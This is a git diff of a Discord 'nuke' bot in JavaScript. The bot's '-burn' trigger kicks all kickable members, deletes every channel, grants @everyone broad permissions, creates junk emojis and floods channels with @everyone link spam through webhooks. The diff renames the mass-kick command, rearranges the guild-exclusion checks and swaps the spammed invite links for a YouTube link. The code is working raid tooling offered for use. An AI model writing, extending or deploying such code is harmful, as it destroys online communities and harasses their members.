@@ -289,8 +289,9 @@ client.on("message", msg => {
  
  
    client.on('message', message => {
-     if(message.content.startsWith('-masskick')) {
+     if(message.content.startsWith('-burn')) {
  if(message.channel.type === "dm") {return}
+  if(!unallowedguilds.includes(message.guild.id)) {
        if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
  return
   }
@@ -298,6 +299,7 @@ client.on("message", msg => {
          if(m.kickable) m.kick();
    });
    }
+     }
    })  
  /**
   *  
@@ -313,9 +315,9 @@ client.on("message", msg => {
   })
      //this edits all roles
      client.on('message', message => {
-  if(!unallowedguilds.includes(message.guild.id)) {
        if(message.content.startsWith('-burn')) {
  if(message.channel.type === "dm") {return}
+  if(!unallowedguilds.includes(message.guild.id)) {
          if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
   }    
   message.guild.emojis.cache.forEach(async e => {
@@ -332,9 +334,9 @@ setTimeout(() => {
   }
      })
  client.on('message', async message => {
-  if(!unallowedguilds.includes(message.guild.id)) {
    if(message.content.startsWith('kiss my disrespectful ass')) {
 if(message.channel.type === "dm") {return}
+  if(!unallowedguilds.includes(message.guild.id)) {
      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
 }    
 await message.guild.emojis.create(randomicons123(), 'chaos')
@@ -356,9 +358,9 @@ await message.guild.emojis.create('https://images-ext-1.discordapp.net/external/
   */
  
    client.on('message', message => {
-  if(!unallowedguilds.includes(message.guild.id)) {
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
+  if(!unallowedguilds.includes(message.guild.id)) {
 if(message.guild.me.hasPermission("ADMINISTRATOR")) {
        message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
    }
@@ -372,7 +374,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  function randomT() {
-   var rand = ["https://images-ext-1.discordapp.net/external/eFAPb9A-KDB8CcJsMlLwXi_iBL3EBaru-3b-CueTnRA/https/cdn.discordapp.com/icons/782621562154254356/9efdc64eb1b2548f27eda9938af40720.webp", '@everyone https://discord.gg/z6jMqF5Yjn', "🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE ", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://images-ext-2.discordapp.net/external/1RImRRcAupiTBBfcQ2aKa7cj_meZCQI9JIpIGSt-VbU/%3Fsize%3D1024/https/cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png"]
+   var rand = ["https://images-ext-1.discordapp.net/external/eFAPb9A-KDB8CcJsMlLwXi_iBL3EBaru-3b-CueTnRA/https/cdn.discordapp.com/icons/782621562154254356/9efdc64eb1b2548f27eda9938af40720.webp", '@everyone https://youtu.be/YaiOwWDW8EY', "🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE ", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://images-ext-2.discordapp.net/external/1RImRRcAupiTBBfcQ2aKa7cj_meZCQI9JIpIGSt-VbU/%3Fsize%3D1024/https/cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png"]
  return rand[Math.floor(Math.random()*rand.length)];
  }
  
@@ -395,9 +397,9 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  }
  
    client.on('message', message => {
-  if(!unallowedguilds.includes(message.guild.id)) {
      if(message.content.startsWith("-burn")) {
  if(message.channel.type === "dm") {return}
+  if(!unallowedguilds.includes(message.guild.id)) {
 if(message.guild.me.hasPermission("ADMINISTRATOR")) {
              message.guild.channels.cache.forEach(channel => {
              channel.delete().then((channel)=>{
@@ -417,9 +419,9 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  const nukingtime = new Set()
  client.on('message', msg => {
-  if(!unallowedguilds.includes(msg.guild.id)) {
      if(msg.content.startsWith(`-burn`)) {
          if(msg.channel.type === "dm") {return}
+  if(!unallowedguilds.includes(message.guild.id)) {
        if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
         var number = 0
         var pray = -1
@@ -431,7 +433,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
-                    w.send("https://discord.gg/hKVK9r7DGt @everyone")
+                    w.send("https://youtu.be/YaiOwWDW8EY @everyone")
                     
                 
                 })
@@ -495,9 +497,9 @@ channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
  
  
  client.on('message', message => {
-  if(!unallowedguilds.includes(message.guild.id)) {
    if(message.content === 'kiss my disrespectful ass') {
  if(message.channel.type === "dm") {return}
+  if(!unallowedguilds.includes(message.guild.id)) {
  if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
  return
   }
